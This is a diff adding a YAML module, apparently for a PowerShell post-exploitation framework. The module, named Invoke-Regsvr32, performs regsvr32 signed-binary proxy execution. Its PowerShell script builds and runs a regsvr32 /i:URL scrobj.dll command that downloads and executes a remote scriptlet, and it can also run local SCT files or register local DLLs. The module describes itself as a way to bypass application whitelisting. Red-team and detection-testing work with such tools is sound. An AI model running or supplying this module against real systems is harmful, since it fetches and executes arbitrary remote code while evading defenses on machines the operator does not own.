@@ -1,0 +1,101 @@
+name: Invoke-Regsvr32
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Executes code via regsvr32.exe signed binary proxy execution.
+  Regsvr32 is a command-line utility to register and unregister OLE
+  controls including DLLs and ActiveX controls. Supports remote SCT
+  scriptlet execution via /i flag with scrobj.dll, local SCT file
+  execution, and local DLL registration. This is commonly used by
+  adversaries to bypass application whitelisting.
+software: ''
+tactics: [TA0005]
+techniques: [T1218.010]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: Execution method to use.
+    required: true
+    value: 'remote_sct'
+    suggested_values:
+      - remote_sct
+      - local_sct
+      - local_dll
+  - name: ScriptletUrl
+    description: URL to remote SCT scriptlet file.
+    required: false
+    value: ''
+    depends_on:
+      - name: Method
+        values: ['remote_sct']
+  - name: LocalFile
+    description: Path to local SCT or DLL file.
+    required: false
+    value: ''
+    depends_on:
+      - name: Method
+        values: ['local_sct', 'local_dll']
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-Regsvr32 {
+      param(
+          [string]$Method = "remote_sct",
+          [string]$ScriptletUrl,
+          [string]$LocalFile
+      )
+
+      switch ($Method.ToLower()) {
+          "remote_sct" {
+              if (-not $ScriptletUrl) {
+                  Write-Output "[-] ScriptletUrl is required for remote_sct method."
+                  return
+              }
+              $cmdLine = "regsvr32.exe /s /u /i:$ScriptletUrl scrobj.dll"
+              Write-Output "[*] Executing remote SCT via regsvr32..."
+              $result = cmd /c $cmdLine 2>&1
+              Write-Output "[+] Executed: $cmdLine"
+              if ($result) { Write-Output $result }
+          }
+          "local_sct" {
+              if (-not $LocalFile -or -not (Test-Path $LocalFile)) {
+                  Write-Output "[-] Valid LocalFile path required for local_sct method."
+                  return
+              }
+              $cmdLine = "regsvr32.exe /s /u /i:`"$LocalFile`" scrobj.dll"
+              Write-Output "[*] Executing local SCT via regsvr32..."
+              $result = cmd /c $cmdLine 2>&1
+              Write-Output "[+] Executed: $cmdLine"
+              if ($result) { Write-Output $result }
+          }
+          "local_dll" {
+              if (-not $LocalFile -or -not (Test-Path $LocalFile)) {
+                  Write-Output "[-] Valid LocalFile path required for local_dll method."
+                  return
+              }
+              $cmdLine = "regsvr32.exe /s `"$LocalFile`""
+              Write-Output "[*] Registering local DLL via regsvr32..."
+              $result = cmd /c $cmdLine 2>&1
+              Write-Output "[+] Executed: $cmdLine"
+              if ($result) { Write-Output $result }
+          }
+          default {
+              Write-Output "[-] Invalid method: $Method."
+          }
+      }
+  }
+script_end: Invoke-Regsvr32 {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
